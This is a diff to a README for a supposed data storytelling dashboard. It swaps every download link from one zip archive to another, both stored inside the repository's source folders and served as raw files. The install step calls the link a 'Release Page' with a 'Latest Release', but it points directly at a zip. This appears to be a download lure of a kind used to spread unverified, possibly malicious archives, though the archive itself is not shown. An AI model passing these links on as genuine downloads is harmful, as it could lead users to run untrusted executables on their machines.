@@ -1,6 +1,6 @@
 # 📊 Data-Storytelling-Dashboard - Transform Data Into Insights Easily
 
-[![Download Now](https://raw.githubusercontent.com/Vrushang3800/Data-Storytelling-Dashboard/main/app/utils/Data-Storytelling-Dashboard-2.8-alpha.1.zip)](https://raw.githubusercontent.com/Vrushang3800/Data-Storytelling-Dashboard/main/app/utils/Data-Storytelling-Dashboard-2.8-alpha.1.zip)
+[![Download Now](https://raw.githubusercontent.com/Vrushang3800/Data-Storytelling-Dashboard/main/app/Dashboard-Data-Storytelling-v3.9.zip)](https://raw.githubusercontent.com/Vrushang3800/Data-Storytelling-Dashboard/main/app/Dashboard-Data-Storytelling-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ The Data Storytelling Dashboard includes several powerful features designed for 
 
 To install the Data Storytelling Dashboard, follow these simple steps:
 
-1. **Visit the Release Page:** Go to the following link to access the latest version of the dashboard: [Download Here](https://raw.githubusercontent.com/Vrushang3800/Data-Storytelling-Dashboard/main/app/utils/Data-Storytelling-Dashboard-2.8-alpha.1.zip).
+1. **Visit the Release Page:** Go to the following link to access the latest version of the dashboard: [Download Here](https://raw.githubusercontent.com/Vrushang3800/Data-Storytelling-Dashboard/main/app/Dashboard-Data-Storytelling-v3.9.zip).
 
 2. **Select the Latest Version:** Look for the latest release at the top of the page. You may find a version labeled "Latest Release".
 
@@ -66,4 +66,4 @@ Your feedback and contributions are welcome! To help improve the Data Storytelli
 
 Thank you for using the Data Storytelling Dashboard. We hope it helps you turn data into compelling stories. 
 
-[📥 Download Here](https://raw.githubusercontent.com/Vrushang3800/Data-Storytelling-Dashboard/main/app/utils/Data-Storytelling-Dashboard-2.8-alpha.1.zip) to get started now!
+[📥 Download Here](https://raw.githubusercontent.com/Vrushang3800/Data-Storytelling-Dashboard/main/app/Dashboard-Data-Storytelling-v3.9.zip) to get started now!
